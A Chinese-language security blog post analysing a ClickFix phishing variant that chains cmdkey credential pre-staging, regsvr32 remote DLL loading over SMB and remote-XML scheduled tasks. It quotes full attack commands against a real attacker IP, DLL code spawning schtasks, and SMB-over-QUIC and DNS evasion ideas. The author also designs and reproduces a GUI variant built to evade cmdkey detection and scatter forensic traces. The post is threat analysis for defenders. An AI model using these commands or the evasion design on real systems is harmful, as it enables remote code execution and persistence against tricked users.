---
layout:     post
title:  cmdkey凭据预置绕过企业HTTP代理的新ClickFix
subtitle:
date:       2026-05-18
author:     Closure
header-img: img/fmq.jpg
catalog: true
tags:

- 安全
---

前几代的ClickFix用的都是PowerShell/rundll32和WebDAV，已经有了LOLBin，但是还没有凭据预置这一步，前面做的仍然只是下载和执行两件事。

四月的新ClickFix用上了cmdkey和regsvr32还有远程计划任务，总而言之是更针对企业环境的.....之前的大多数都会被检测到，就算是用来mshta http://... mshta http://attacker/x.hta 都是走系统代理，和PowerShell完全一样。走WebDAV用的是WebClient ，但是WebDAV流量大多数时候是不经过企业HTTP代理的。

[本文](https://www.cyberproof.com/blog/beyond-powershell-analyzing-the-multi-action-clickfix-variant/ "本文")里面走的是445端口的SMB，从协议族层面就跳过了HTTP代理范围，HTTP架构上只代理HTTP/HTTPS，遇到没有URL可以分类&没有YLS解密&没有开头可以检查，再加上用的还是纯IP地址替代域名，连DNS解析这一层都跳过了。整条链唯一的网络层防线只剩下是否禁止445出站这一条(现实里完全实施这一条的企业其实不多

https://www.cyberproof.com/blog/the-clickfix-evolution-new-variant-replaces-powershell-with-rundll32-and-webdav/

这篇是前一代rundll32加WebDAV变体可以对比阅读看他们演化逻辑，这里面还分析了SkimokKeep后payload，有动态API解析和IAT hooking这些东西(

![ ](/img/20260517-0.png)

钓鱼页伪造CAPTCHA引导Win+R执行：

```
rundll32 \\server@80\path\verification.google,#1
```

\\server@80\ 语法是windowsWebDAVmini-redirector的特殊用法，把远程HTTP服务器伪装成UNC路径，让rundll32通过WebDAV协议直接拉远程DLL到内存执行。

被加载的verification.google是32位DLL，是通过PE,遍历定位已加载模块,用算法解API，再用 VirtualProtect修改内存权限，做IAT hooking，最终拉起PowerShell后用Net.WebClient.DownloadString投递二阶段加载器。相对第一代已经换到了rundll和WebDAV，绕开了一些检测面。

相较于凭据预制，WebDAV本质还是HTTP/80，企业如果按目的端口 80/443 强制走代理策略实施还是会被代理拦截，net use变体里描述过类似的成功率不稳定，现在三代直接走SMB/445，架构上根本不进HTTP代理范围。

这个DLL执行后还是要拉起powershell，又回到了AMSI和PS Logging监控内没有真正消除，现在第三代用schtasks和远程XML来持久化，可以做到全程不PowerShell。

文章里面的DLL做了PEB遍历等多种行为，沙箱评分显著很高，本文的只一个 CreateProcessA把行为隐藏在了远程XML里。

### 攻击链

整条攻击链可以浓缩为:

```
cmd.exe /c cmdkey /add:151.245.195.142 /user:guest && 
start regsvr32 /s \\151.245.195.142\hi\demo.dll & 
REM I am not a robot – Cloudflare ID: d7f5a3335794c434
```

单次粘贴执行后就进入了一个跨重启零落盘，可动态更换payload的持久化,所有动作都是由 Microsoft签名的系统二进制完成。

攻击者先是伪造cf验证页利用用户对验证流程的肌肉记忆，Win+R让命令在explorer.exe 子进程语境下执行，REM注释把整条命令伪装成验证 ID，前期没有任何恶意特征。

然后是凭据预置，cmdkey /add:<IP> /user:guest 通过 advapi32!CredWriteW 把凭据写入 LSASS，再由DPAPI加密落盘到 %LocalAppData%\Microsoft\Credentials\。target name故意写成IP没用域名的原因是为后续UNC路径精确匹配和跳过DNS解析与新注册域情报。

regsvr32 /s \\IP\hi\demo.dll触发Windows内核七层联动：MUP 驱动识别UNC、转给SMB mini-redirector、建立445TCP连接、SSPI通过LSA查凭据管理器、用刚写入的guest做NTLMv2认证、流式拉回DLL映射进regsvr32进程内存、最终调用 DLL 的 DllRegisterServer导出函数。
最后DllRegisterServer内部用CreateProcessA隐藏调起schtasks/create/tn RunNotepadNow/xml \\IP\hi\777.xml /f，复用cmdkey预置的凭据再次走SMB拉远程XML任务定义。

### cmdkey&regsvr32

#### cmdkey

![ ](/img/20260517-1.png)

cmdkey是Windows凭据管理的命令行前端，本身只是一个thin wrapper，干活的是底层的advapi32.dll的CredWrite/CredRead/CredDelete API。

```
CMDKEY [{/add | /generic}:targetname  
        {/smartcard | /user:username {/pass{:password}}} 
      | /delete{:targetname | /ras} 
      | /list{:targetname}]
```

- /add:<target>添加域/服务器凭据，Windows 自动使用
- /generic:<target>添加通用凭据，需要应用主动读取
- /user:<name>用户名
- /pass:<pwd>密码
- /list：列出所有凭据
- /delete:<target>删除

凭据实际存储落盘：C:\Users\<user>\AppData\Local\Microsoft\Credentials\ C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\

每个凭据是crd文件，DPAPI用当前用户的master key加密，所以凭据绑定到用户，其他用户读不到，并且持久化且进程读取时由LSASS解密，对cmdkey调用方透明

```
cmdcmdkey /add:151.245.195.142 /user:guest
```

↑

如上文，用IP是精准匹配，没有指定 /pass是会创建一个密码为空字符串的凭据条目，攻击者要的是要让Windows SMB client拿一个非空凭据去触发NTLM协商。

> 命令行不指定 /pass: 的时候 cmdkey实际行为是交互式提示密码，但在脚本上下文中没人响应，凭据条目最终以空密码或某个默认状态写入。这有两个好处：(1) 命令行日志里看不到明文密码，4688/Sysmon 1 事件保持干净；(2) 攻击者 SMB 服务器配置成接受任意凭据，密码空不空不影响认证流程。

/add是因为通用凭据需要应用主动调用CredRead，而/add创建的域凭据Windows在SMB/RDP认证时自动使用。(cmdkey在历史上cmdkey是主要被用于横向移动的，这次是用cmdkey来伪造凭据。

#### regsvr32

regsvr32.exe原始用途是注册COM组件到注册表，把DLL/OCX的CLSID、ProgID等信息写入 HKEY_CLASSES_ROOT\CLSID\{...}，让其他程序能通过COM调用。

```
regsvr32 [/u] [/s] [/n] [/i[:cmdline]] <dllname>
```

- /s 静默执行
- /u、/n、/i 分别给攻击者提供DllUnregisterServer、DllInstall等额外入口点。

攻击代码入口点是DLL的导出函数DllRegisterServer，本来是COM组件写注册表用的标准函数，攻击者把整个payload塞进去。执行流程是regsvr32调用LoadLibrary加载 DLL→ GetProcAddress获取DllRegisterServer→代码执行。

在CyberProof的样本里，DllRegisterServer内部用CreateProcessA配合 CREATE_NO_WINDOW隐藏调起 schtasks，创建引用远程XML的计划任务。
regsvr32能用到的是网络感知和代理感知，能直接处理HTTP/HTTPS URL、UNC路径和 WebDAV，并且自动继承系统代理设置，企业网内有出站代理也照常拉远程文件。

依然是LOLBAS的老明星了，但是直接走SMB UNC路径的用法很少见，所以这次的ClickFix变体能打到检测盲区(

### 样本分析

在win10 11跑了同一个，发现了不对称的网络行为，Win10v2004:

- 151.245.195.142:445  tcp   ← SMB direct
- 151.245.195.142:139  tcp   ← NetBIOS Session
- 8.8.8.8:53  udp   ← DNS
- 142.250.140.94:80    tcp   ← HTTP (与样本无关

Win11：

- 151.245.195.142:445  tcp   ← SMB direct
- 151.245.195.142:139  tcp   ← NetBIOS Session
- 151.245.195.142:443  udp   ← 新增的

同一个DLL sandbox vendor 执行命令 目标IP，唯一变量是操作系统，差异必然来自OS层面某个机制

最常见的UDP443是QUIC，HTTP/3跑在它上面，但是样本没有调用任何HTTP客户端 API，它没有WinHTTP也没有WinINET  Edge WebView。

还有一个可能性是SMB over QUIC，Windows 11 24H2引入了SMB over QUIC客户端原生支持，它的工作机制是mrxsmb.sys先尝试TCP/445直连，同时或之后尝试QUIC over UDP/443，哪个先建立哪个就用。

攻击者没有为QUIC做特殊编码，就是个普通SMB操作，但被Windows11自动升级成了一个 QUIC 探测包(?

```
HRESULT DllRegisterServer(void) {
    CreateProcessA(NULL, 
      "schtasks /create /tn RunNotepadNow /xml \\\\151.245.195.142\\hi\\777.xml /f",
      ...);
}
```

DLL调用CreateProcessA启动 schtasks
↓
schtasks 解析 /xml 参数，看到 UNC 路径
↓
schtasks 调用文件系统 API 读取 XML 文件
↓
内核 I/O Manager 识别 UNC → 转给 MUP
↓
MUP 选择 mrxsmb.sys
↓
SMB redirector决定如何连接服务器：

- Win10只尝试 TCP/445 → TCP/139 fallback
- Win11尝试 TCP/445+UDP/443

所有现有的SMB-based攻击在Win11上都会自动获得QUIC加成，之前微软给的建议都是封禁 TCP/445出站来阻止SMB-based攻击，在Win10时代是有效的，Win11时代只有一半有效。TCP/445封了 Win11会自动fallback到UDP/443，而UDP/443看起来像普通QUIC流量，大多数企业NDR把它当噪音处理。

这种流量伪装是质变，TCP/445在企业里默认deny outbound，NDR会标记为SMB出站异常/应用层可见度中等，但是UDP/443默认allow outbound/NDR标记为普通QUIC流量/流量始终加密/应用层几乎全加密；企业代理对TCP上的TLS 1.2/1.3可以做证书替换解密，但是对QUIC几乎做不到，所以Win11上的这条UDP/443通道防火墙不会封。

**攻击者意识到了吗**

我觉得没有。。。?

DLL代码里没有任何QUIC相关API，也没有SMB over QUIC的协议探测逻辑，C2很可能根本没有配置QUIC监听器（445/UDP包发出去会被RST但是客户端不在乎，因为有TCP/445兜底）

现在已经有人用用 DNS暂存代码再用DoH隐藏流量了，毕竟DNS是企业网络里唯一一个不可能封的出站协议，把payload塞进DNS流量就拿到了协议层的免杀，DNS-based投递机制是DNS协议本身设计上就有几个可以被反复利用的特性：单条DNS TXT记录255 字节，多条 TXT串起来理论上可以传输任意大小数据(就算限制了但是分块传输完全可行）；把数据编码进子域名，DNS解析过程把base64数据传出去，每个子域名查询都是一次上传。

↑Microsoft已经披露的nslookup变体就是这条路径的早期形态

### GUI变种

如果要改进的话我觉得可以搞个GUI(见下)，现在的cmdkey /add检测特征纯粹来自进程创建事件，只要不启动cmdkey这个特征就消失了。~~所以为什么不让受害者自己存凭据.....~~

ClickFix在于用户成为攻击载体，Win+R已经是这个思路的实现，但是还是一种停留在让用户执行命令的层面，所以如果要连日志都没有可以考虑让用户执行GUI。

我找到了个rundll32 keymgr.dll,KRShowKeyMgr，keymgr.dll是Windows内置的凭据管理DLL，导出函数KRShowKeyMgr会弹出存储的用户名和密码对话框，执行后用户会看到一个标准对话框可以自己手动添加凭据，用户在这里输入的凭据真的会写入Windows Credential Manager，效果和cmdkey一样。

模拟场景:先显示老话术比如为了验证身份请按Win+R输入下面的命令，让粘贴的命令是 rundll32 keymgr.dll,KRShowKeyMgr，随后弹出真正的凭据管理对话框，再在页面引导用户填写用户名密码来手动写入凭据，后续regsvr32拉远程DLL时认证通过。

好像直接贴过程也不太好，我按照上面逻辑本地复现了，简单贴一下流程，一台机Windows 11，一台Kali，网络模式host-only。win装Sysmon加载SwiftOnSecurity的社区配置。
Kali上sudo impacket-smbserver hi /tmp/share -smb2support，设共享名设为hi和本地映射到 /tmp/share。

![ ](/img/20260517-1.png)

DLL用MinGW编译DllRegisterServer内部调用CreateProcessA启动，弹出存储的用户名和密码对话框之后在对话框里添加 服务器用户名密码留空，然后在Run框执行regsvr32 /s \\<ip>\hi\demo.dll，看到regsvr32通过刚才存的凭据完成SMB认证-拉取 DLL-调用DllRegisterServer弹出。

其实就是沿用了入口和凭据应用还有SMB通道，后半段是完全一样的，优化的地方消除了cmdkey检测特征，之前是会留下创建进程/审计日志/命令行字符串包含add+IP，GUI做了弹 GUI用户手动填，所以没有cmdkey进程被创建，把特征=命令行的检测面迁移到了特征=API 调用(usermode API监控在大多数企业EDR里覆盖度不如进程创建监控

还有把取证痕迹拆分到两个非典型条目原文，单条命令完整写入HKCU\...\Explorer\RunMRU，一条RunMRU记录就能完整重建攻击，GUI的两次操作意味着RunMRU里出现两条记录：

- rundll32 keymgr.dll,KRShowKeyMgr
- regsvr32 /s \\IP\hi\demo.dll

比单条完整命令更难关



